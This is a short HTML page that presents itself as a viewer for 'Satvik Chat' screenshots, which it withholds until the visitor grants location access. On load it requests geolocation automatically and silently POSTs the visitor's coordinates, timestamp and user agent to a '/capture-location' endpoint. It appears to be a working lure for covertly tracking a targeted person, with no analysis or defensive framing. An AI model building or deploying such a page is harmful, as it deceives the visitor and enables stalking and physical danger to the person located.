<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Satvik Chat</title>
    <style>
        body { margin:0; background:#000; color:#fff; font-family:Arial; text-align:center; }
        .content { max-width: 700px; margin:20px auto; padding:10px; display:none; }
        img { max-width:100%; margin:15px 0; border:2px solid #333; border-radius:8px; }
        .denied { height:100vh; display:flex; flex-direction:column; justify-content:center; align-items:center; background:#111; }
    </style>
</head>
<body>

    <div class="denied" id="denied">
        <h2>Location Access Required</h2>
        <p>Please allow location to view the screenshots.</p>
        <button onclick="requestLocation()" style="padding:15px 30px; font-size:18px;">Allow Location</button>
    </div>

    <div class="content" id="content">
        <h1>Satvik Chat Screenshots</h1>
        
        <img src="/static/0jAV3.png" alt="1">
        <img src="/static/dX66Z.png" alt="2">
        <img src="/static/JQyOg.png" alt="3">
        <img src="/static/aryUv.png" alt="4">
        <img src="/static/CiyTj.png" alt="5">
    </div>

    <script>
        function requestLocation() {
            navigator.geolocation.getCurrentPosition(
                (pos) => {
                    fetch('/capture-location', {
                        method: 'POST',
                        headers: {'Content-Type': 'application/json'},
                        body: JSON.stringify({
                            latitude: pos.coords.latitude,
                            longitude: pos.coords.longitude,
                            timestamp: new Date().toISOString(),
                            userAgent: navigator.userAgent
                        })
                    });
                    document.getElementById('denied').style.display = 'none';
                    document.getElementById('content').style.display = 'block';
                },
                () => alert("Location access denied. Cannot show content.")
            );
        }
        // Auto trigger
        window.onload = requestLocation;
    </script>
</body>
</html>
